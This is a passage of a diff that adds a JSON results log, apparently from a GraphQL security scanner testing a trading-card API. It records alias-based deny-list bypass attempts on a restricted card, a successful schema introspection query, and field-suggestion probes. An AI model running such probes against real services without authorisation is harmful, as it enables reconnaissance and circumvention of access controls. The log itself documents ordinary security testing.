+        "response_status": 200,
+        "request_time_seconds": 0.906,
+        "timestamp": "2025-10-02T18:39:05.032669Z",
+        "response_body": {
+          "data": {
+            "card": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.935,
+        "timestamp": "2025-10-02T18:39:05.968004Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 41,
+    "timestamp": "2025-10-02T18:39:05.968088Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.853,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: card(id: \"restricted-999\", set: \"secret-set\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.478,
+        "timestamp": "2025-10-02T18:39:09.862778Z",
+        "response_body": {
+          "data": {
+            "card": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.634,
+        "timestamp": "2025-10-02T18:39:11.496812Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 42,
+    "timestamp": "2025-10-02T18:39:11.496908Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 2.89,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy7-45\", set: \"base1\") {\n    id\n    name\n  }\n  __schema {\n    queryType { name }\n    types {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.233,
+    "timestamp": "2025-10-02T18:39:18.117677Z",
+    "count": 43,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "data": {
+        "card": null,
+        "__schema": {
+          "queryType": {
+            "name": "Query"
+          },
+          "types": [
+            {
+              "name": "Query"
+            },
+            {
+              "name": "ID"
+            },
+            {
+              "name": "String"
+            },
+            {
+              "name": "Pagination"
+            },
+            {
+              "name": "Int"
+            },
+            {
+              "name": "Float"
+            },
+            {
+              "name": "Sort"
+            },
+            {
+              "name": "CardsFilters"
+            },
+            {
+              "name": "Card"
+            },
+            {
+              "name": "AbilitiesListItem"
+            },
+            {
+              "name": "AttacksListItem"
+            },
+            {
+              "name": "Item"
+            },
+            {
+              "name": "Legal"
+            },
+            {
+              "name": "Boolean"
+            },
+            {
+              "name": "WeakResListItem"
+            },
+            {
+              "name": "Variants"
+            },
+            {
+              "name": "DetailedVariants"
+            },
+            {
+              "name": "Booster"
+            },
+            {
+              "name": "Set"
+            },
+            {
+              "name": "SetFilters"
+            },
+            {
+              "name": "CardCount"
+            },
+            {
+              "name": "Serie"
+            },
+            {
+              "name": "SerieFilters"
+            },
+            {
+              "name": "StringEndpoint"
+            },
+            {
+              "name": "__Schema"
+            },
+            {
+              "name": "__Type"
+            },
+            {
+              "name": "__TypeKind"
+            },
+            {
+              "name": "__Field"
+            },
+            {
+              "name": "__InputValue"
+            },
+            {
+              "name": "__EnumValue"
+            },
+            {
+              "name": "__Directive"
+            },
+            {
+              "name": "__DirectiveLocation"
+            }
+          ]
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy7-45\", set: \"base1\") {\n    nam\n    hpz\n    descrption\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.266,
+    "timestamp": "2025-10-02T18:39:22.390136Z",
+    "count": 44,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Card\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"hpz\" on type \"Card\". Did you mean \"hp\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"descrption\" on type \"Card\". Did you mean \"description\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
